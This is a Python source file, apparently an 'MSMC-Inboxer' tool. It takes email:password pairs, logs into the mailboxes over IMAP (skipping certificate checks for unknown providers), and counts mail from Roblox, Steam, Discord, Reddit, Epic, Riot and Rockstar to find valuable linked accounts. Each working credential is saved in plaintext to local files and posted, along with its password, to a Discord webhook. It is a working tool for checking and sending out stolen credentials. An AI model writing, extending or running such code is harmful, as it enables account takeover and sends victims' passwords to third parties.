import imaplib
import requests
import json
import os
import re
import ssl
import logging
import time
import base64
from email.utils import parsedate_to_datetime
from datetime import datetime

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# Load configuration files
try:
    with open('Inbox/config.json', 'r') as config_file:
        config = json.load(config_file)
    with open('Inbox/custom_checks.json', 'r') as custom_file:
        custom_checks = json.load(custom_file)
except Exception as e:
    logger.error(f"Failed to load config files: {e}")
    raise

# Default Checks
check_roblox = config["default_checks"]["roblox"]
check_steam = config["default_checks"]["steam"]
check_discord = config["default_checks"]["discord"]
check_reddit = config["default_checks"]["reddit"]
check_epicgames = config["default_checks"]["epicgames"]
check_riot = config["default_checks"]["riotgames"]
check_rockstar = config["default_checks"]["rockstargames"]

discord_webhook = config["discord_webhook"]

def parsedate(date_str):
    try:
        return parsedate_to_datetime(date_str)
    except Exception as e:
        logger.warning(f"Error parsing date: {e}")
        return None

def fetch_emails(imap, query):
    try:
        result, data = imap.uid("search", None, query)
        if result == "OK":
            return data[0].split()
        return []
    except Exception as e:
        logger.error(f"Error searching emails: {e}")
        return []

def fetch_email_date(imap, uid):
    try:
        result, data = imap.uid("fetch", uid, "(BODY[HEADER.FIELDS (DATE)])")
        if result == "OK":
            date_str = data[0][1].decode().strip()
            return parsedate(date_str)
        return None
    except Exception as e:
        logger.error(f"Error fetching email date: {e}")
        return None

def connect_imap(server, email, password):
    for attempt in range(3):  # Try up to 3 times
        try:
            # Create SSL context with modern security settings
            ssl_context = ssl.create_default_context()
            
            # Adjust SSL settings based on provider
            if 'outlook' in server or 'office365' in server:
                ssl_context.minimum_version = ssl.TLSVersion.TLSv1_2
                ssl_context.verify_mode = ssl.CERT_REQUIRED
            elif 'gmail' in server:
                ssl_context.check_hostname = True
                ssl_context.verify_mode = ssl.CERT_REQUIRED
            else:
                ssl_context.check_hostname = False
                ssl_context.verify_mode = ssl.CERT_NONE
            
            logger.info(f"Attempt {attempt + 1}: Connecting to {server}...")
            
            # Set timeout and enable debug for troubleshooting
            imap = imaplib.IMAP4_SSL(
                host=server,
                port=993,
                timeout=45,
                ssl_context=ssl_context
            )
            imap.debug = 4  # Enable verbose debug output
            
            # Try standard login first
            try:
                logger.info("Attempting standard login...")
                result, response = imap.login(email, password)
                if result == "OK":
                    logger.info("Login successful")
                    return imap
            except imaplib.IMAP4.error:
                logger.info("Standard login failed, trying basic AUTHENTICATE...")
                try:
                    creds = f"{email}\x00{password}"
                    encoded = base64.b64encode(creds.encode()).decode()
                    result, response = imap._simple_command('AUTHENTICATE', 'PLAIN', encoded)
                    if result == "OK":
                        logger.info("Basic authentication successful")
                        return imap
                except Exception as e:
                    logger.error(f"Basic authentication failed: {e}")
            
            logger.error(f"Login failed: {response}")
            time.sleep(3)  # Wait before retrying
            
        except imaplib.IMAP4.error as e:
            logger.error(f"IMAP protocol error: {str(e)}")
            if "AUTHENTICATIONFAILED" in str(e):
                logger.error("Authentication failed. Please verify credentials.")
            elif "Too many login attempts" in str(e):
                logger.error("Too many login attempts. Try again later.")
            time.sleep(5)  # Longer wait for rate-limited errors
        except ssl.SSLError as e:
            logger.error(f"SSL error: {str(e)}")
            time.sleep(3)
        except Exception as e:
            logger.error(f"Connection error: {str(e)}")
            time.sleep(3)
    
    logger.error("All connection attempts failed")
    return None

def inboxmail(email, password):
    if not email or not password:
        logger.error("Email and password cannot be empty")
        return

    email_parts = email.split('@')
    if len(email_parts) < 2:
        logger.error("Invalid email format")
        return

    domain = email_parts[-1].lower()
    
    # Common IMAP server mappings
    server_mappings = {
        'gmail.com': 'imap.gmail.com',
        'outlook.com': 'outlook.office365.com',
        'hotmail.com': 'outlook.office365.com',
        'yahoo.com': 'imap.mail.yahoo.com',
        'aol.com': 'imap.aol.com'
    }
    
    # Try known servers first, then fallback to imap.{domain}
    imap_servers = [server_mappings.get(domain, f'imap.{domain}')]

    for imap_server in imap_servers:
        imap = connect_imap(imap_server, email, password)
        if not imap:
            continue

        try:
            status, messages = imap.select("inbox")
            if status != "OK":
                logger.error(f"Failed to select inbox for {email}")
                continue

            counts = {}
            discord_year = None
            reddit_year = None

            if check_roblox:
                accounts_data = fetch_emails(imap, '(FROM "accounts@roblox.com")')
                noreply_data = fetch_emails(imap, '(FROM "no-reply@roblox.com")')
                counts['Roblox'] = len(accounts_data) + len(noreply_data)

            if check_steam:
                steam_data = fetch_emails(imap, '(FROM "noreply@steampowered.com")')
                counts['Steam'] = len(steam_data)

            if check_discord:
                discord_uids = fetch_emails(imap, '(FROM "noreply@discord.com")')
                counts['Discord'] = len(discord_uids)
                if discord_uids:
                    email_date = fetch_email_date(imap, discord_uids[0])
                    if email_date:
                        discord_year = email_date.year

            if check_reddit:
                main_uids = fetch_emails(imap, '(FROM "noreply@reddit.com")')
                mail_uids = fetch_emails(imap, '(FROM "noreply@redditmail.com")')
                counts['Reddit'] = len(main_uids) + len(mail_uids)
                if mail_uids:
                    email_date = fetch_email_date(imap, mail_uids[0])
                    if email_date:
                        reddit_year = email_date.year
                elif main_uids:
                    email_date = fetch_email_date(imap, main_uids[0])
                    if email_date:
                        reddit_year = email_date.year

            if check_epicgames:
                epic_data = fetch_emails(imap, '(FROM "help@accts.epicgames.com")')
                counts['Epic Games'] = len(epic_data)

            if check_riot:
                riot_data = fetch_emails(imap, '(FROM "noreply@mail.accounts.riotgames.com")')
                counts['Riot'] = len(riot_data)

            if check_rockstar:
                rockstar_data = fetch_emails(imap, '(FROM "noreply@rockstargames.com")')
                counts['Rockstar'] = len(rockstar_data)

            for check_name, check_info in custom_checks.items():
                if check_name.lower() == "example_check":
                    continue
                if check_info.get("enabled", False):
                    custom_data = fetch_emails(imap, f'(FROM "{check_info["email"]}")')
                    counts[check_name] = len(custom_data)

            if not os.path.exists('Valid Mails'):
                os.makedirs('Valid Mails')

            for service, count in counts.items():
                if count > 0:
                    with open(f'Valid Mails/{service}.txt', 'a') as file:
                        file.write(f'{email}:{password} | {count} hits\n')

            if any(count > 0 for count in counts.values()):
                embed = {
                    "title": "Valid Mail",
                    "description": f"{email}:{password}",
                    "color": 0x00f556,
                    "fields": [],
                    "footer": {
                        "text": ".gg/PGer • MSMC-Inboxer"
                    }
                }

                for service, count in counts.items():
                    if count > 0:
                        if service == 'Reddit' and reddit_year:
                            embed["fields"].append({
                                "name": service,
                                "value": f"``{count} Hits (Estimated Year: {reddit_year})``",
                                "inline": True
                            })
                        elif service == 'Discord' and discord_year:
                            embed["fields"].append({
                                "name": service,
                                "value": f"``{count} Hits (Estimated Year: {discord_year})``",
                                "inline": True
                            })
                        else:
                            embed["fields"].append({
                                "name": service,
                                "value": f"``{count} Hits``",
                                "inline": True
                            })

                try:
                    response = requests.post(discord_webhook, json={"embeds": [embed]})
                    if response.status_code != 204:
                        logger.error(f"Webhook failed: {response.status_code}, {response.text}")
                except Exception as e:
                    logger.error(f"Webhook error: {e}")

        except Exception as e:
            logger.error(f"Error processing {email}: {e}")
        finally:
            try:
                imap.close()
                imap.logout()
            except Exception as e:
                logger.warning(f"Error closing connection: {e}")

if __name__ == '__main__':
    email = input("Enter email: ")
    password = input("Enter password: ")
    inboxmail(email, password)